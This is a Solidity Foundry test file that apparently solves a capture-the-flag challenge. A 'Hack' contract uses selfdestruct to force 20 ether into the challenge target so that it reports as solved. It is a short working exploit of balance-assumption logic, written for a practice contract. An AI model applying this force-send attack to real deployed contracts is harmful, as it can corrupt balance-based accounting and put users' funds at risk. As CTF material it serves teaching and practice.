// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {BaseTest} from "forge-ctf/CTFDeployment.sol";
import {console2} from "forge-std/console2.sol";

import "src/Challenge.sol";

contract Solve is BaseTest {
    function setUp() public override {
        super.setUp();

        vm.prank(system);
        challenge = address(new Challenge());
    }

    function testSolve() public {
        vm.startBroadcast(player);
        console2.log("Solving challenge...");
        console2.log("Player balances:", player.balance);
        Hack helper = new Hack();
        helper.attack{value:20 ether}(Challenge(challenge).TARGET());
        vm.stopBroadcast();

        assert(validation());
    }

    function validation() internal returns (bool) {
        return Challenge(challenge).isSolved();
    }
}

contract Hack {
    function attack(address _challenge) payable external {
        selfdestruct(payable(_challenge));
    }

    fallback() external payable {}
    receive() external payable {}
}